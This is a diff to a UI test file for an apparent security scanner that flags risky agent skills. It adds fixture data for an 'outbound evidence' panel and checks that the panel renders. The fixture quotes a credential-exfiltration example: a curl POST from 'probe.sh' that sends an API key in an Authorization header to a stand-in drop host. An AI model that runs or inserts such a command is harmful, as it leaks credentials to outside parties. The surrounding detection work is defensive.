@@ -72,6 +72,31 @@ test('renders install telemetry and history alongside skill evidence', () => {
 						rawPayload: { source: 'skillsmp' }
 					}
 				],
+				outboundEvidence: [
+					{
+						path: 'probe.sh',
+						category: 'credential_transmission',
+						severity: 'high',
+						context: 'direct_operational',
+						evidence: 'curl -X POST https://drop.example/upload',
+						sourceKind: 'authorization_header',
+						sourceValues: ['MATON_API_KEY'],
+						sinkKind: 'requests.post',
+						sinkUrl: 'https://drop.example/upload',
+						sinkHost: 'drop.example',
+						transportDetail: 'Authorization header',
+						destinations: [
+							{
+								ip: '203.0.113.10',
+								countryCode: 'CN',
+								countryName: 'China',
+								asnName: 'Example Transit',
+								isPrimaryCyberConcern: true
+							}
+						],
+						hasPrimaryCyberConcernDestination: true
+					}
+				],
 				installHistory: [
 					{
 						id: 1,
@@ -156,6 +181,12 @@ test('renders install telemetry and history alongside skill evidence', () => {
 	expect(screen.getByRole('heading', { name: 'Why this skill is flagged' })).toBeInTheDocument();
 	expect(screen.getByText(/Hard evidence/)).toBeInTheDocument();
 	expect(screen.getAllByText(/Posts local files to a remote endpoint/).length).toBeGreaterThan(0);
+	expect(screen.getByRole('heading', { name: 'Outbound evidence' })).toBeInTheDocument();
+	expect(screen.getByText(/MATON_API_KEY/)).toBeInTheDocument();
+	expect(screen.getAllByText(/drop\.example/).length).toBeGreaterThan(0);
+	expect(screen.getByText(/203.0.113.10/)).toBeInTheDocument();
+	expect(screen.getByText(/China/)).toBeInTheDocument();
+	expect(screen.getByText(/Primary cyber concern/)).toBeInTheDocument();
 	expect(screen.getByRole('heading', { name: 'Behavior findings' })).toBeInTheDocument();
 	expect(screen.getAllByRole('link', { name: 'drop.example' }).length).toBeGreaterThan(0);
 });
@@ -188,6 +219,7 @@ test('renders a no-hard-evidence verdict when the latest snapshot is clean', () 
 						registryRank: 1
 					}
 				],
+				outboundEvidence: [],
 				sourceEntries: [],
 				installHistory: [],
 				externalVerdicts: [],
